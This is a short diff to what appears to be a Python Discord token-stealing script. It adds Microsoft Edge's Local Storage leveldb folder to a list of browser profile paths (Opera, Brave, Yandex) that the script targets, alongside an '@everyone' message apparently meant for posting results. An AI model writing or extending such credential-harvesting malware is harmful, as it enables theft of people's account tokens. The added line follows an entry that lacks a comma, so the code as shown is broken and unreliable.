@@ -31,6 +31,7 @@ def main():
         'Opera': roaming + '\\Opera Software\\Opera Stable',
         'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
         'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\'
     }
 
     message = '@everyone'
